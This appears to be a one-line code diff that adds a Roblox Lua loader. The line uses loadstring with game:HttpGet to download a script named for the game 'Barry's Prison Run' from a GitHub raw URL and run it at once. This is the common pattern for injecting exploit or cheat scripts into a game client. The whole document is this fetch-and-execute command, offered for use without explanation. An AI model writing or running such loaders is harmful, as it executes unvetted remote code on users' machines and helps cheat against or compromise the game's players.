@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdminEvilDRagon/BarryPrisonRun/main/BarryPrisonRun"))()
